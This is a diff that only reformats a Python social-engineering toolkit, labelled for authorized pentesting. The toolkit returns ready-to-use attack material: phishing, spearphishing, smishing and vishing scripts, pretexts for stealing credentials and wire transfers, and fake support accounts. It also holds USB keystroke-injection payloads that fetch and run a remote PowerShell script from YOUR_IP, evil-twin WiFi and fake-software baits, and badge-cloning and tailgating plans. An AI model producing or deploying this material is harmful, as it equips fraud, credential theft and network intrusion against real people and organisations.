@@ -9,11 +9,9 @@ and physical security assessments for authorized pentesting.
 For authorized security testing only.
 Requires written authorization before execution.
 """
+
 import subprocess
 import json
-import os
-import time
-from datetime import datetime
 
 
 class SocialEngineeringAdvanced:
@@ -61,28 +59,28 @@ class SocialEngineeringAdvanced:
             "credential_harvest": {
                 "subject": "Action Required: Account Verification Needed",
                 "body": "Dear User,\n\nWe've detected unusual activity on your account. Please verify your credentials immediately to avoid temporary suspension.\n\nClick here to verify: [LINK]\n\nIT Security Team",
-                "type": "Credential Harvest"
+                "type": "Credential Harvest",
             },
             "mfa_bypass": {
                 "subject": "Your MFA Code",
                 "body": "Your verification code is: [CODE]\nThis code expires in 5 minutes.\nIf you didn't request this, ignore this message.",
-                "type": "MFA Bypass"
+                "type": "MFA Bypass",
             },
             "oauth_consent": {
                 "subject": "External App Access Request",
                 "body": "[SENDER] has requested access to your [SERVICE] account.\nApprove: [LINK]\nDeny: [LINK]",
-                "type": "OAuth Consent"
+                "type": "OAuth Consent",
             },
             "password_reset": {
                 "subject": "Password Reset Request",
                 "body": "A password reset was requested for your account.\nIf this was you, click: [LINK]\nIf not, contact IT immediately.",
-                "type": "Password Reset"
+                "type": "Password Reset",
             },
             "sharepoint": {
                 "subject": "[NAME] shared a document with you",
                 "body": "[SENDER] shared 'Q4_Report.xlsx' with you.\nView Document: [LINK]\nThis link expires in 24 hours.",
-                "type": "SharePoint Lure"
-            }
+                "type": "SharePoint Lure",
+            },
         }
         template = templates.get(scenario, templates["credential_harvest"])
         return json.dumps(template, indent=2)
@@ -96,7 +94,7 @@ class SocialEngineeringAdvanced:
             "scenario": scenario,
             "template": self.create_phishing_email(scenario),
             "status": "Template ready for authorized testing",
-            "note": "This is a SIMULATION for authorized pentesting only"
+            "note": "This is a SIMULATION for authorized pentesting only",
         }
         return json.dumps(result, indent=2)
 
@@ -110,9 +108,9 @@ class SocialEngineeringAdvanced:
             "template": {
                 "subject": f"Board Meeting - {company} Confidential",
                 "body": f"Dear {target_name},\n\nPlease review the attached merger documents before Thursday's board meeting.\n\nAccess: [LINK]\n\nBest regards,\nCEO Office",
-                "type": "Executive Spearphishing"
+                "type": "Executive Spearphishing",
             },
-            "status": "Template ready for authorized testing"
+            "status": "Template ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -124,24 +122,24 @@ class SocialEngineeringAdvanced:
             "tech_support": {
                 "pretext": "Call from IT helpdesk about detected malware",
                 "goals": ["Get remote access credentials", "Install remote tool", "Get VPN details"],
-                "script": "Hello, this is IT Security. We detected malware on your machine. We need immediate access to fix it."
+                "script": "Hello, this is IT Security. We detected malware on your machine. We need immediate access to fix it.",
             },
             "executive": {
                 "pretext": "CEO needs urgent wire transfer",
                 "goals": ["Wire authorization", "Bank details", "Amount confirmation"],
-                "script": "This is urgent. I need you to process a wire transfer immediately."
+                "script": "This is urgent. I need you to process a wire transfer immediately.",
             },
             "hr": {
                 "pretext": "HR needs to verify benefits enrollment",
                 "goals": ["SSN", "Date of birth", "Bank details"],
-                "script": "Hi, I'm from HR. We need to verify your benefits enrollment information."
-            }
+                "script": "Hi, I'm from HR. We need to verify your benefits enrollment information.",
+            },
         }
         result = {
             "target": target_phone,
             "scenario": scenario,
             "details": scenarios.get(scenario, scenarios["tech_support"]),
-            "status": "Script ready for authorized testing"
+            "status": "Script ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -154,13 +152,13 @@ class SocialEngineeringAdvanced:
             "bank": "Your bank account has been locked. Verify identity: [LINK]",
             "prize": "Congratulations! You won a $1000 gift card. Claim: [LINK]",
             "covid": "COVID Alert: You've been exposed. Report: [LINK]",
-            "tax": "IRS: You have a pending refund. Claim: [LINK]"
+            "tax": "IRS: You have a pending refund. Claim: [LINK]",
         }
         result = {
             "target": target_phone,
             "scenario": scenario,
             "message": messages.get(scenario, messages["package"]),
-            "status": "Message ready for authorized testing"
+            "status": "Message ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -174,17 +172,17 @@ class SocialEngineeringAdvanced:
             "fake_accounts": [
                 f"@{target_brand.lower()}support",
                 f"@{target_brand.lower()}help",
-                f"{target_brand.lower()}_support_official"
+                f"{target_brand.lower()}_support_official",
             ],
             "template": {
                 "bio": f"Official {target_brand} Support. DM us for immediate assistance.",
                 "responses": [
                     "I see the issue. Please DM me your account details so I can help.",
                     "We need to verify your identity. Click this link to confirm.",
-                    "There's a known issue. Let me send you the fix."
-                ]
+                    "There's a known issue. Let me send you the fix.",
+                ],
             },
-            "status": "Template ready for authorized testing"
+            "status": "Template ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -199,10 +197,10 @@ class SocialEngineeringAdvanced:
                 f"1. Clone {target_url} with wget --mirror",
                 "2. Replace form action URLs with capture endpoint",
                 "3. Host on attacker-controlled domain",
-                "4. Send phishing link to targets"
+                "4. Send phishing link to targets",
             ],
             "tools": ["SET (Social Engineering Toolkit)", "GoPhish", "Evilginx2"],
-            "status": "Clone scenario ready for authorized testing"
+            "status": "Clone scenario ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -217,10 +215,10 @@ class SocialEngineeringAdvanced:
                     "Hi, this is [NAME] from IT Support.",
                     "We detected unusual activity from your workstation.",
                     "We need to run a remote diagnostic tool.",
-                    "Can you provide your login credentials for verification?"
+                    "Can you provide your login credentials for verification?",
                 ],
                 "tools_needed": ["Remote desktop tool", "Fake diagnostic software"],
-                "data_targets": ["Credentials", "VPN access", "System information"]
+                "data_targets": ["Credentials", "VPN access", "System information"],
             },
             "delivery": {
                 "role": "Delivery Courier",
@@ -230,10 +228,10 @@ class SocialEngineeringAdvanced:
                     "I have a package for [NAME].",
                     "There's an issue with the address label.",
                     "Can you confirm your full name and address?",
-                    "I also need a signature for this package."
+                    "I also need a signature for this package.",
                 ],
                 "tools_needed": ["Fake delivery uniform", "Package with tracking device"],
-                "data_targets": ["Full name", "Address", "Signature"]
+                "data_targets": ["Full name", "Address", "Signature"],
             },
             "inspector": {
                 "role": "Building Inspector",
@@ -243,10 +241,10 @@ class SocialEngineeringAdvanced:
                     "I'm here for the annual safety inspection.",
                     "We need to check the server room.",
                     "Can you escort me to the network closet?",
-                    "I need to document all equipment serial numbers."
+                    "I need to document all equipment serial numbers.",
                 ],
                 "tools_needed": ["Fake badge", "Clipboard with forms", "Camera"],
-                "data_targets": ["Physical access", "Network equipment", "Server details"]
+                "data_targets": ["Physical access", "Network equipment", "Server details"],
             },
             "auditor": {
                 "role": "External Auditor",
@@ -256,10 +254,10 @@ class SocialEngineeringAdvanced:
                     "I'm here for the quarterly security audit.",
                     "We need to verify access controls.",
                     "Can you provide the current admin password?",
-                    "We also need to check firewall rules."
+                    "We also need to check firewall rules.",
                 ],
                 "tools_needed": ["Fake business card", "Audit documentation"],
-                "data_targets": ["Admin credentials", "Network diagrams", "Security policies"]
+                "data_targets": ["Admin credentials", "Network diagrams", "Security policies"],
             },
             "vendor": {
                 "role": "Vendor Technician",
@@ -269,11 +267,11 @@ class SocialEngineeringAdvanced:
                     "I'm here for the scheduled maintenance.",
                     "We need to update the network equipment.",
                     "Can you provide console access?",
-                    "We also need to verify the current configuration."
+                    "We also need to verify the current configuration.",
                 ],
                 "tools_needed": ["Vendor badge", "Equipment bag", "Fake work order"],
-                "data_targets": ["Console access", "Configuration", "Network topology"]
-            }
+                "data_targets": ["Console access", "Configuration", "Network topology"],
+            },
         }
         pretext = pretexts.get(scenario, pretexts["tech_support"])
         return json.dumps(pretext, indent=2)
@@ -288,7 +286,7 @@ class SocialEngineeringAdvanced:
             "scenario": scenario,
             "pretext": json.loads(pretext),
             "call_script": self.generate_pretext(scenario)["script"],
-            "status": "Pretext ready for authorized testing"
+            "status": "Pretext ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -301,23 +299,23 @@ class SocialEngineeringAdvanced:
             "rubber_ducky": {
                 "device": "USB Rubber Ducky",
                 "script": "DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\"\nENTER",
-                "description": "Keystroke injection payload"
+                "description": "Keystroke injection payload",
             },
             "badusb": {
                 "device": "Arduino-based USB",
-                "script": "Keyboard.begin();\nKeyboard.println(\"powershell -ep bypass -w hidden\");\nKeyboard.println(\"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\");",
-                "description": "Arduino USB attack device"
+                "script": 'Keyboard.begin();\nKeyboard.println("powershell -ep bypass -w hidden");\nKeyboard.println("IEX(New-Object Net.WebClient).DownloadString(\'http://YOUR_IP/shell.ps1\')");',
+                "description": "Arduino USB attack device",
             },
             "usbdrop": {
                 "device": "Standard USB Drive",
                 "contents": [" autorun.inf", " report.docx.exe", " salary_2024.xlsx.exe"],
-                "description": "Social engineering USB drop"
+                "description": "Social engineering USB drop",
             },
             "hak5_wifi_pineapple": {
                 "device": "WiFi Pineapple",
                 "attack": "Evil Portal + credential capture",
-                "description": "Rogue access point"
-            }
+                "description": "Rogue access point",
+            },
         }
         payload = payloads.get(payload_type, payloads["rubber_ducky"])
         return json.dumps(payload, indent=2)
@@ -332,11 +330,11 @@ class SocialEngineeringAdvanced:
                 {"label": "Free WiFi", "url": "http://YOUR_IP/captive", "placement": "Break room"},
                 {"label": "Employee Survey", "url": "http://YOUR_IP/survey", "placement": "Common areas"},
                 {"label": "Package Tracking", "url": "http://YOUR_IP/track", "placement": "Reception"},
-                {"label": "Event Registration", "url": "http://YOUR_IP/event", "placement": "Conference room"}
+                {"label": "Event Registration", "url": "http://YOUR_IP/event", "placement": "Conference room"},
             ],
             "tools": ["qrencode", "ZBar"],
             "command": "qrencode -o qr_bait.png 'http://YOUR_IP/captive'",
-            "status": "QR bait ready for authorized testing"
+            "status": "QR bait ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -350,15 +348,15 @@ class SocialEngineeringAdvanced:
                 "hostapd_conf": f"interface=wlan0\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nwpa=2\nwpa_passphrase=welcome123\nwpa_key_mgmt=WPA-PSK",
                 "dhcp_range": "192.168.1.100,192.168.1.200",
                 "gateway": "192.168.1.1",
-                "dns": "8.8.8.8"
+                "dns": "8.8.8.8",
             },
             "captive_portal": "Credential harvesting login page",
             "capture_options": [
                 "Captive portal with fake login",
                 "HTTPS redirect with certificate warning",
-                "Terms of service acceptance with credential capture"
+                "Terms of service acceptance with credential capture",
             ],
-            "status": "WiFi bait ready for authorized testing"
+            "status": "WiFi bait ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -371,7 +369,7 @@ class SocialEngineeringAdvanced:
             "vpn": {"name": "SecureVPN Free", "file": "SecureVPN_Setup.exe"},
             "antivirus": {"name": "FreeAntiVirus", "file": "FreeAV_Install.exe"},
             "pdf_reader": {"name": "PDF Pro Reader", "file": "PDFReader_Pro.exe"},
-            "password_manager": {"name": "PasswordSafe", "file": "PasswordSafe_Setup.exe"}
+            "password_manager": {"name": "PasswordSafe", "file": "PasswordSafe_Setup.exe"},
         }
         sw = software_map.get(software, software_map["video_player"])
         result = {
@@ -379,7 +377,7 @@ class SocialEngineeringAdvanced:
             "file": sw["file"],
             "distribution": ["Fake download site", "Forum posts", "Social media"],
             "payload_options": ["Reverse shell", "Credential stealer", "RAT"],
-            "status": "Software bait ready for authorized testing"
+            "status": "Software bait ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -395,16 +393,16 @@ class SocialEngineeringAdvanced:
                 "Carry large box to appear as delivery",
                 "Use clipboard to appear as inspector",
                 "Talk on phone to appear distracted",
-                "Ask employee to hold door"
+                "Ask employee to hold door",
             ],
             "tools": [
                 "Fake ID badge",
                 "Company-branded clothing",
                 "Coffee cup (to occupy hands)",
-                "Clipboard with fake forms"
+                "Clipboard with fake forms",
             ],
             "timing": "During shift changes (8-9am, 5-6pm)",
-            "status": "Tailgating plan ready for authorized testing"
+            "status": "Tailgating plan ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -420,18 +418,12 @@ class SocialEngineeringAdvanced:
                 "Post-it notes with passwords",
                 "Network diagrams",
                 "Employee directories",
-                "Old access badges"
+                "Old access badges",
             ],
-            "tools": [
-                "Flashlight",
-                "Gloves",
-                "Trash bags",
-                "Document scanner",
-                "USB drive for extraction"
-            ],
+            "tools": ["Flashlight", "Gloves", "Trash bags", "Document scanner", "USB drive for extraction"],
             "timing": "Before scheduled trash pickup",
             "legal_note": "Verify local laws - dumpster diving legality varies by jurisdiction",
-            "status": "Dumpster diving plan ready for authorized testing"
+            "status": "Dumpster diving plan ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -444,24 +436,24 @@ class SocialEngineeringAdvanced:
                 "reader": "Proxmark3",
                 "freq": "125kHz or 13.56MHz",
                 "steps": ["Read badge", "Clone to blank", "Test access"],
-                "blank_cost": "$5-15 per blank"
+                "blank_cost": "$5-15 per blank",
             },
             "smart_card": {
                 "reader": "Card reader + software",
                 "steps": ["Skim card data", "Write to compatible card", "Test access"],
-                "difficulty": "Medium-High"
+                "difficulty": "Medium-High",
             },
             "nfc": {
                 "reader": "ACR122U or smartphone",
                 "steps": ["Read NFC data", "Clone to NFC tag", "Test access"],
-                "blank_cost": "$1-3 per tag"
-            }
+                "blank_cost": "$1-3 per tag",
+            },
         }
         info = badge_info.get(badge_type, badge_info["proximity"])
         result = {
             "badge_type": badge_type,
             "details": info,
-            "status": "Badge cloning plan ready for authorized testing"
+            "status": "Badge cloning plan ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -476,17 +468,17 @@ class SocialEngineeringAdvanced:
                 {"type": "Disc Detainer", "tool": "Disc pick", "difficulty": "Hard"},
                 {"type": "Lever Lock", "tool": "Lever picks", "difficulty": "Medium"},
                 {"type": "Master Lock", "tool": "Combination decode", "difficulty": "Easy"},
-                {"type": "Smart Lock", "tool": "Vulnerability scan", "difficulty": "Variable"}
+                {"type": "Smart Lock", "tool": "Vulnerability scan", "difficulty": "Variable"},
             ],
             "tools": [
                 "Pick set (hooks, rakes, diamonds)",
                 "Tension wrenches",
                 "Bump keys",
                 "Decode tools",
-                "Practice locks"
+                "Practice locks",
             ],
             "approach": "Test all physical access points systematically",
-            "status": "Lockpicking assessment ready for authorized testing"
+            "status": "Lockpicking assessment ready for authorized testing",
         }
         return json.dumps(result, indent=2)
 
@@ -504,11 +496,12 @@ class SocialEngineeringAdvanced:
         results.append(self.create_usb_bait("rubber_ducky"))
         results.append("\n=== PHYSICAL SCENARIOS ===")
         results.append(self.tailgating_plan(target))
-        return '\n'.join(results)
+        return "\n".join(results)
 
 
 if __name__ == "__main__":
     import sys
+
     if len(sys.argv) < 2:
         print("Usage: social_adv.py <target>")
         sys.exit(1)
